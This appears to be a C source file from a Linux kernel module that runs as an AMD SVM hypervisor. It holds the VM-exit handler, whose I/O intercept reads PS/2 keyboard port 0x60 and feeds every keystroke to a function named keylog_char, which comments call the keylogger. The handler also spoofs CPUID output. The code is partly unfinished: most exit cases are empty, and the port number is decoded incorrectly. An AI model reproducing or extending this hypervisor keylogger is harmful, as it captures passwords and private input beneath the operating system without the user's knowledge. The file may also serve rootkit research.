#include <linux/kernel.h>
#include <asm/io.h>

#include "exit_handle.h"
#include "vmcb.h"
#include "svm_utils.h"
#include "apic.h"
#include "keylogger.h"

#ifdef DEBUG_ENABLED
# define DEBUG_PRINT(...) printk(__VA_ARGS__)
#else
# define DEBUG_PRINT(...) do {} while (0)
#endif

extern void * __global_Host_Reg_Store; 
extern void * __global_Guest_Reg_Store;
extern void * __global_VMCB_VA;
extern phys_addr_t __global_VMCB_PA;

void handle_vmexit(void){
	vmcb_t * vmcb = (vmcb_t *) __global_VMCB_VA;
	uint64_t exitcode = (uint64_t) vmcb->control_area.EXIT_CODE;
	//DEBUG_PRINT("Hit exit handler....\n");
	//DEBUG_PRINT("EXIT CODE: 0x%llx\n", exitcode);
	//DEBUG_PRINT("EXIT INFO1: 0x%llx\n", vmcb->control_area.EXIT_INFO1);
	//DEBUG_PRINT("EXIT INFO2: 0x%llx\n", vmcb->control_area.EXIT_INFO2);
	//DEBUG_PRINT("EXIT INT INFO: 0x%llx\n", vmcb->control_area.EXIT_INT_INFO);

	switch(exitcode){
		case VMEXIT_IOIO:
            handle_ioio();
			break;
		case VMEXIT_INTR:
			handle_phys_int();
			break;
		case VMEXIT_CPUID:
			DEBUG_PRINT("CPUID Instruction Intercept\n");
			vmcb->state_save_area.rax = 0xffffffff;
			*(uint64_t *)(__global_Guest_Reg_Store + 32) = 0x20796548;
			*(uint64_t *)(__global_Guest_Reg_Store + 40) = 0x72656854;
			*(uint64_t *)(__global_Guest_Reg_Store + 48) = 0x293A2065;
			//vmcb->state_save_area.rbx = 0xAAAAAAAA;
			//vmcb->state_save_area.rcx = 0xBBBBBBBB;
			//vmcb->state_save_area.rdx = 0xcafebaee;
            vmcb->state_save_area.rip = vmcb->control_area.nRIP;
			break;
		case VMEXIT_RDTSC:
			DEBUG_PRINT("RDTSC Instruction Intercept\n");
			// This is just a test:
			vmcb->state_save_area.rax = 0xdeadbeef;
			vmcb->control_area.instr_intercepts.RDTSC = 0;
			debug_vmcb(vmcb);
			break;
        case VMEXIT_EXCP14:	/* Page fault */
		    break;
        case VMEXIT_CR0_READ:
            //do_cr0_read();//next step to finish the handler
            break;
        case VMEXIT_CR0_WRITE:
            break;
        case VMEXIT_CR3_READ:
            break;
        case VMEXIT_CR3_WRITE:
            break;
        case VMEXIT_CR4_READ:
            break;
        case VMEXIT_CR4_WRITE:
            break;
        case VMEXIT_INVLPG:
            break;
        case VMEXIT_TASK_SWITCH:
            break;
        case VMEXIT_MSR:
            break;
        case VMEXIT_NPF:
            break;
        case VMEXIT_VMMCALL:
            break;
        case VMEXIT_INIT:
            break;
        case VMEXIT_NMI:
            break;
        case VMEXIT_CLGI:
            break;
        case VMEXIT_STGI:
            break;
        case VMEXIT_VMRUN:
            break;
        case VMEXIT_INVLPGA:
            break;
		default:
			// We better not hit this
			break;
	}
	
	// If the exit was caused by an instr_interrupt
	// if(exitcode >= 0x65 && exitcode <= 0x7f){
	// 	vmcb->state_save_area.rip = vmcb->control_area.nRIP;
	// }

	vmcb->control_area.EXIT_CODE = 0;
	vmcb->control_area.EXIT_INFO1 = 0;
	vmcb->control_area.EXIT_INFO2 = 0;
	vmcb->control_area.EXIT_INT_INFO = 0;

	return;	
}

void handle_phys_int(void){
    vmcb_t * vmcb = (vmcb_t *) __global_VMCB_VA;
    // get_current_irrs();
    // get_current_isrs();
    DEBUG_PRINT("Handling phys int..");
    if(is_timer_interrupt()){
        vmcb->control_area.guest_int_ctrl.V_INTR_PRIO = 4;
        vmcb->control_area.guest_int_ctrl.V_INTR_VEC = 236;
        vmcb->control_area.guest_int_ctrl.V_IRQ = 1;
        vmcb->control_area.EVENTINJ = 236 + (0 << 8) + (0 << 11) + (1 << 31);
    } else {
        DEBUG_PRINT("Holy crap, not a timer interrupt\n");
    }
    return;
}

/*
    Obviously the handler for IO stuff
    Implementation only works with keyboard IO rn.
    Port = 0x60 (data) for PS/2 Keyboard

    This is basically the keylogger
*/

void handle_ioio(void){
    vmcb_t * vmcb = (vmcb_t *) __global_VMCB_VA;
    uint64_t ecode = vmcb->control_area.EXIT_CODE;
    uint64_t einfo1 = vmcb->control_area.EXIT_INFO1;
    uint64_t einfo2 = vmcb->control_area.EXIT_INFO2;

    // Decoding EXITINFO1
    int io_type = einfo1 & 0x1;    // 1 = Read, 0 = Write
    int str_based = einfo1 & (0x1 << 2);  // (INS, OUTS)
    int op_size;    // Operand Size
    int addr_size;  // N-bit Address
    int port_num;   // Intercepted I/O Port

    if (einfo1 & (0x1 << 4)){
        op_size = 8;
    } else if (einfo1 & 0x1 << 5) {
        op_size = 16;
    } else {
        op_size = 32;
    }
    
    if (einfo1 & (0x1 << 7)){
        addr_size = 16;
    } else if (einfo1 & 0x1 << 8) {
        addr_size = 32;
    } else {
        addr_size = 64;
    }

    port_num = einfo1 & (0xFFFF << 16);

    // "DECODING" EXITINFO2
    uint64_t next_instruction = einfo2;

    // IO Read (IN)
    if (io_type == 1){
        char val = inb(0x60);
        vmcb->state_save_area.rax = (uint64_t) val;
        keylog_char(val);
    }    

    // IO Write (OUT) 
    else {
        char val = (char)(vmcb->state_save_area.rax & 0xFF);
        outb(val, 0x60);
    }

    vmcb->state_save_area.rip = next_instruction;
    return;
}



